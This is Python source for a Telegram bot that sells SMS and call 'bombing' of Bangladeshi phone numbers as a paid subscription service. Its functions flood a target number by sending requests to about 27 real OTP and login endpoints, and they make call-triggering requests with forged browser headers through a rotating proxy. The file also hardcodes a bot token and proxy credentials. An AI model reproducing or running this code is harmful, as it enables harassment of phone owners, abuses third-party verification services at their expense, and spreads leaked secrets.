import os
import json
import time
import sqlite3
import asyncio
import urllib.request
import urllib.error
import requests
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Configuration Constants
BOT_TOKEN = "8240474292:AAEfini_pLQSNMhIu2OqOp13p09zE59U8C0"
ADMIN_ID = 7740120627  # Your Admin Chat ID
DB_NAME = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            name TEXT,
            role TEXT DEFAULT 'User',
            trial_uses INTEGER DEFAULT 2,
            sub_expiry TEXT,
            total_refers INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            days INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_setting(key, default_val=""):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else default_val

def set_setting(key, value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_user(user_id, name="User"):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    if not user:
        cursor.execute("""
            INSERT INTO users (user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned)
            VALUES (?, ?, 'User', 2, '', 0, 0, 0)
        """, (user_id, name))
        conn.commit()
        cursor.execute("SELECT user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned FROM users WHERE user_id = ?", (user_id,))
        user = cursor.fetchone()
    conn.close()
    return user

def update_user_field(user_id, field, value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
    conn.commit()
    conn.close()

def is_subscribed(user_id):
    user = get_user(user_id)
    sub_expiry = user[4]
    if not sub_expiry:
        return False
    try:
        expiry_date = datetime.strptime(sub_expiry, "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry_date:
            return True
    except:
        pass
    return False

def execute_call_bomber(number):
    # 1. 88mbets Call Bomber Request
    try:
        proxy_host = "p.webshare.io"
        proxy_port = "80"
        proxy_user = "ahgqhhwq-rotate"
        proxy_pass = "15dzbyne9f6m"
        
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        proxy_handler = urllib.request.ProxyHandler({
            'http': proxy_url,
            'https': proxy_url
        })
        
        opener = urllib.request.build_opener(proxy_handler)
        urllib.request.install_opener(opener)

        url = 'https://www.8mbets.net/api/user/request-register-tac'
        payload = {
            "uname": f"880{number}",
            "sendType": "mobile",
            "country_code": "880",
            "currency": "BDT",
            "mobileno": number,
            "language": "bn",
            "langCountry": "bn-bd"
        }

        headers = {
            'host': 'www.8mbets.net',
            'domain': 'www.8mbets.net',
            'sec-ch-ua-platform': '"Android"',
            'lang': 'bn-bd',
            'pwa': '0',
            'sec-ch-ua': '"Android WebView";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
            'page': '/bn-bd/register',
            'sec-ch-ua-mobile': '?1',
            'device': 'mobile',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; RMX3933 Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.39 Mobile Safari/537.36',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.8mbets.net',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.8mbets.net/bn-bd/register',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'priority': 'u=1, i',
            'cookie': 'ipcountry=BD; _mswin1=fb.1.1791669168881.1774459633; click_register_id=reg_btn_5; pwa=0; _cfuvid=AP1PjEMOkd7PmkMjwibc5MFtN_oxykw.eGYTPhz5zqE-1791746969.788945-1.0.1.1-URXFAs14iz76QegpyboO7NMxpV2Eml2c3NW1HQtlJ9o; __cf_bm=eK5aqX065fXn3KBJZN52LGuLl6zlL1eopHIT9FqdYNs-1791746980.8177142-1.0.1.1-RRHlvuSgW6tKK_w9NGcMWYuqL2mECeF9PO_e4U9MT.qL5xDq5wm3.m4KsR1eJmxn59DwQg0imXQ1.C.91Ah9Y4ZzM4Ef1ds4Ehhju.hjR5br2_8dntxkNeViLGSpVMge'
        }

        data = json.dumps(payload).encode('utf-8')
        headers['content-length'] = str(len(data))

        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=10) as response:
            pass
    except Exception as e:
        print(f"88mbets Call Bomber Error: {e}")

    # 2. Eyecon Call/OTP Bomber Request
    try:
        eyecon_url = "https://api.eyecon-app.com/app/cli_auth/gettransport"
        formatted_cli = f"880{number}" if not number.startswith("880") else number
        params = {
            'cv': 'vc_739_vn_4.2026.02.19.1555_a',
            'cli': formatted_cli,
            'reg_id': '',
            'is_already_social_auth': 'false',
            'installer_name': 'manually or unknown source',
            'n_sims': '1',
            'time': str(int(time.time() * 1000)),
            'is_sms_sending_available': 'true',
            'is_whatsapp_installed': 'false',
            'mc': '51:32:4E:5B:2A:8C',
            'device_id': '14d03a7cf44a4000',
            'time_zone': 'Asia/Dhaka',
            'device_manu': 'Google',
            'device_model': 'Pixel 4'
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'accept-charset': 'UTF-8',
            'content-type': 'application/x-www-form-urlencoded; charset=utf-8'
        }
        requests.get(eyecon_url, params=params, headers=headers, timeout=10)
    except Exception as e:
        print(f"Eyecon Bomber Error: {e}")

def execute_sms_bomber(number):
    apis = [
        {"url": "https://waltonplaza.com.bd/api/auth/otp/create", "data": {"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": number}, "captchaToken": "recapcha"}},
        {"url": "https://api.apex4u.com/api/auth/login", "data": {"phoneNumber": number}},
        {"url": "https://core.easy.com.bd/api/v1/forgot-password-otp", "data": {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": number}},
        {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "data": {"phone": number}},
        {"url": "https://api.chardike.com/api/otp/send", "data": {"phone": number, "otp_type": "login"}},
        {"url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", "data": {"phone": number}},
        {"url": "https://gateway.otithee.com/api/v1/generate-otp", "data": {"request_type": "registration", "mobile_number": number}},
        {"url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "data": {"country_code": "+88", "phone": number}},
        {"url": "https://new.mojaru.com/api/student/login", "data": {"mobile_or_email": number}},
        {"url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", "data": {"mobileNumber": number}},
        {"url": "https://api.garibookadmin.com/api/v3/user/login", "data": {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}},
        {"url": "https://api-dynamic.bioscopelive.com/v2/auth/login", "data": {"number": number}},
        {"url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", "data": {"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"}},
        {"url": "https://api-dynamic.chorki.com/v2/auth/login", "data": {"number": number}},
        {"url": "https://api.deeptoplay.com/v2/auth/login", "data": {"number": number}},
        {"url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "data": {"phoneNumber": number}},
        {"url": "https://bb-api.bohubrihi.com/public/activity/otp", "data": {"phone": number, "intent": "login"}},
        {"url": "https://backend.timezonebd.com/api/v1/user/otp-login", "data": {"phone": number}},
        {"url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "data": {"phone": number, "language": "en", "email": ""}},
        {"url": "https://api.shikho.com/public/activity/otp", "data": {"phone": number, "intent": "ap-discount-request"}},
        {"url": "https://edgecoursebd.com/register", "data": {"phone": number}},
        {"url": "https://api.ghoorilearning.com/api/auth/signup/otp", "data": {"mobile_no": number}},
        {"url": "https://api.ostad.app/api/v2/user/with-otp", "data": {"msisdn": number}},
        {"url": "https://www.ieducationbd.com/api/account/check_user", "data": {"mobile": number}},
        {"url": "https://www.shwapno.com/api/auth", "data": {"phoneNumber": number}},
        {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": {"mobile": number, "deviceToken": "web", "language": "en", "os": "web"}},
        {"url": "https://api-merchant.carrybee.com/api/v2/merchant/register", "data": {"name": "@CYBER_X_OF_BANGLADESHH", "phoneNumber": "88" + number, "businessName": "@CYBER_X_OF_BANGLADESHH"}}
    ]

    for api in apis:
        try:
            payload = json.dumps(api['data']).encode('utf-8')
            req = urllib.request.Request(
                api['url'], 
                data=payload, 
                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, 
                method='POST'
            )
            urllib.request.urlopen(req, timeout=3)
        except:
            pass

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Call Bomber", callback_data="call_bomber"), InlineKeyboardButton("💬 SMS Bomber", callback_data="sms_bomber")],
        [InlineKeyboardButton("🛒 Buy Subscription", callback_data="buy_sub"), InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("🎁 Refer & Earn", callback_data="refer_earn"), InlineKeyboardButton("🎟️ Redeem Code", callback_data="redeem_code")],
        [InlineKeyboardButton("📞 Support", callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_user = get_user(user.id, user.first_name)
    
    if db_user[7] == 1:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return

    args = context.args
    referrer_id = int(args[0]) if args and args[0].isdigit() else 0
    if referrer_id and referrer_id != user.id and db_user[6] == 0:
        update_user_field(user.id, "referred_by", referrer_id)
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET total_refers = total_refers + 1 WHERE user_id = ?", (referrer_id,))
        conn.commit()
        conn.close()
        try:
            await context.bot.send_message(referrer_id, "🎉 New user joined via your invite link! Keep referring to unlock free premium.")
        except:
            pass

    welcome_text = (
        f"👋 Hello *{user.first_name}*!\n\n"
        f"🤖 *EXTREME Bot* তে স্বাগতম!\n"
        f"📞 Bangladesh-এর যেকোনো নাম্বারে SMS & Call Bombing করুন।"
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    db_user = get_user(user_id)
    if db_user[7] == 1:
        await query.message.reply_text("❌ You are banned.")
        return

    data = query.data

    if data == "call_bomber":
        context.user_data['waiting_for'] = 'call_number'
        await query.message.reply_text("📞 Enter Target Number for CALL:\n(Example: 017XXXXXXXX)")
    elif data == "sms_bomber":
        context.user_data['waiting_for'] = 'sms_number'
        await query.message.reply_text("💬 Enter Target Number for SMS:\n(Example: 017XXXXXXXX)")
    elif data == "profile":
        u = get_user(user_id)
        role = "Admin ⚡" if user_id == ADMIN_ID else u[2]
        sub_status = f"Active 🟢 (Ends: {u[4]})" if is_subscribed(user_id) else "Inactive 🔴"
        profile_text = (
            f"👤 *My Profile*\n\n"
            f"🆔 User ID: `{u[0]}`\n"
            f"👤 Name: *{u[1]}*\n"
            f"🛡️ Role: {role}\n"
            f"🎁 Trial Uses: {u[3]}\n"
            f"👑 Sub: {sub_status}\n"
            f"👥 Total Refers: {u[5]}"
        )
        await query.message.reply_text(profile_text, parse_mode="Markdown")
    elif data == "buy_sub":
        custom_sub_text = get_setting("buy_sub_text", "⚠️ দুঃখিত, বর্তমানে সাবস্ক্রিপশন বিক্রি বন্ধ আছে। পরবর্তীতে আবার চেষ্টা করুন।")
        await query.message.reply_text(custom_sub_text, parse_mode="Markdown")
    elif data == "refer_earn":
        bot_username = context.bot.username
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        ref_text = (
            f"🎁 *Refer & Earn*\n\n"
            f"🔗 Invite Link:\n`{invite_link}`\n\n"
            f"🎁 Reward: প্রতি ৭ জন সফল রেফারে পাবেন ৩ দিনের Premium Subscription!\n\n"
            f"⚠️ নোট: ফেইক রেফার কাউন্ট হবে না।"
        )
        await query.message.reply_text(ref_text, parse_mode="Markdown")
    elif data == "redeem_code":
        context.user_data['waiting_for'] = 'redeem_input'
        await query.message.reply_text("🎟️ অনুগ্রহ করে আপনার রিডিম কোডটি পাঠান:")
    elif data == "support":
        support_text = (
            f"🏛️ *Support Center*\n\n"
            f"👨‍💻 Admin: `@ExtremBro`\n"
            f"🤖 Dev: `@RakaBro_bot`"
        )
        await query.message.reply_text(support_text, parse_mode="Markdown")
    
    # Admin inline callbacks
    elif data == "adm_stats" and user_id == ADMIN_ID:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = cursor.fetchone()[0]
        conn.close()
        await query.message.reply_text(f"📊 *Bot Statistics*\n\n👤 Total Users: *{total_users}*\n🚫 Banned Users: *{total_banned}*", parse_mode="Markdown")
    elif data == "adm_users" and user_id == ADMIN_ID:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, name, is_banned FROM users LIMIT 30")
        rows = cursor.fetchall()
        conn.close()
        msg = "👥 *Recent Users (Up to 30):*\n\n"
        for r in rows:
            status = "🚫 Banned" if r[2] == 1 else "🟢 Active"
            msg += f"ID: `{r[0]}` | Name: {r[1]} | {status}\n"
        msg += "\nTo ban/unban use:\n`/ban <user_id>`\n`/unban <user_id>`"
        await query.message.reply_text(msg, parse_mode="Markdown")
    elif data == "adm_add_code" and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = 'create_code'
        await query.message.reply_text("✏️ Send code and days in format: `CODE DAYS` (e.g. `FREE3DAYS 3`)", parse_mode="Markdown")
    elif data == "adm_set_sub" and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = 'set_sub_msg'
        await query.message.reply_text("✏️ Send the new message you want to display for 'Buy Subscription':")
    elif data == "adm_broadcast" and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = 'broadcast_msg'
        await query.message.reply_text("📢 Send the message you want to broadcast to all users:")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    admin_keyboard = [
        [InlineKeyboardButton("📊 Bot Statistics", callback_data="adm_stats"), InlineKeyboardButton("👥 User List", callback_data="adm_users")],
        [InlineKeyboardButton("➕ Add Redeem Code", callback_data="adm_add_code"), InlineKeyboardButton("🛒 Edit Sub Message", callback_data="adm_set_sub")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")]
    ]
    await update.message.reply_text("⚙️ *Admin Control Panel*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(admin_keyboard))

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Use: `/ban <user_id>`", parse_mode="Markdown")
        return
    target_id = int(args[0])
    update_user_field(target_id, "is_banned", 1)
    await update.message.reply_text(f"✅ User `{target_id}` has been banned.", parse_mode="Markdown")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Use: `/unban <user_id>`", parse_mode="Markdown")
        return
    target_id = int(args[0])
    update_user_field(target_id, "is_banned", 0)
    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db_user = get_user(user_id)
    if db_user[7] == 1:
        return

    text = update.message.text.strip()
    waiting_for = context.user_data.get('waiting_for')

    if waiting_for == 'call_number':
        context.user_data['waiting_for'] = None
        if not text.isdigit() or len(text) < 10:
            await update.message.reply_text("❌ Invalid mobile number format.")
            return
        u = get_user(user_id)
        if not is_subscribed(user_id) and u[3] <= 0:
            await update.message.reply_text("❌ Your trial uses have ended! Please subscribe or refer friends.")
            return
        
        if not is_subscribed(user_id):
            update_user_field(user_id, "trial_uses", u[3] - 1)

        msg = await update.message.reply_text(f"🚀 *CALL Attack Started!*\n📱 Target: `{text}`", parse_mode="Markdown")
        
        for _ in range(3):
            execute_call_bomber(text)
            await asyncio.sleep(1)
            
        await msg.edit_text(f"✅ *CALL Attack Successfully শেষ হয়েছে!*\n📱 Target: `{text}`", parse_mode="Markdown")

    elif waiting_for == 'sms_number':
        context.user_data['waiting_for'] = None
        if not text.isdigit() or len(text) < 10:
            await update.message.reply_text("❌ Invalid mobile number format.")
            return
        u = get_user(user_id)
        if not is_subscribed(user_id) and u[3] <= 0:
            await update.message.reply_text("❌ Your trial uses have ended! Please subscribe or refer friends.")
            return

        if not is_subscribed(user_id):
            update_user_field(user_id, "trial_uses", u[3] - 1)

        msg = await update.message.reply_text(f"💬 *SMS Attack Started!*\n📱 Target: `{text}`", parse_mode="Markdown")
        
        execute_sms_bomber(text)
        await asyncio.sleep(2)
        
        await msg.edit_text(f"✅ *SMS Attack Successfully শেষ হয়েছে!*\n📱 Target: `{text}`", parse_mode="Markdown")

    elif waiting_for == 'redeem_input':
        context.user_data['waiting_for'] = None
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT days FROM redeem_codes WHERE code = ?", (text,))
        res = cursor.fetchone()
        if res:
            days = res[0]
            cursor.execute("DELETE FROM redeem_codes WHERE code = ?", (text,))
            conn.commit()
            conn.close()

            u = get_user(user_id)
            current_expiry = datetime.now()
            if u[4]:
                try:
                    parsed_exp = datetime.strptime(u[4], "%Y-%m-%d %H:%M:%S")
                    if parsed_exp > datetime.now():
                        current_expiry = parsed_exp
                except:
                    pass
            new_expiry = current_expiry + timedelta(days=days)
            update_user_field(user_id, "sub_expiry", new_expiry.strftime("%Y-%m-%d %H:%M:%S"))
            await update.message.reply_text(f"🎉 Success! Premium added for {days} days.")
        else:
            conn.close()
            await update.message.reply_text("❌ Invalid or expired redeem code.")

    elif waiting_for == 'create_code' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        parts = text.split()
        if len(parts) == 2:
            code, days = parts[0], int(parts[1])
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO redeem_codes (code, days) VALUES (?, ?)", (code, days))
            conn.commit()
            conn.close()
            await update.message.reply_text(f"✅ Redeem code `{code}` created for {days} days.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Format incorrect. Use: `CODE DAYS`")

    elif waiting_for == 'set_sub_msg' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        set_setting("buy_sub_text", text)
        await update.message.reply_text("✅ Buy Subscription message updated successfully!")

    elif waiting_for == 'broadcast_msg' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        all_users = cursor.fetchall()
        conn.close()

        success, failed = 0, 0
        status_msg = await update.message.reply_text("📢 Broadcasting message...")
        for u in all_users:
            try:
                await context.bot.send_message(u[0], text, parse_mode="Markdown")
                success += 1
                await asyncio.sleep(0.05)
            except:
                failed += 1
        await status_msg.edit_text(f"📢 *Broadcast Completed!*\n\n✅ Sent: {success}\n❌ Failed: {failed}", parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()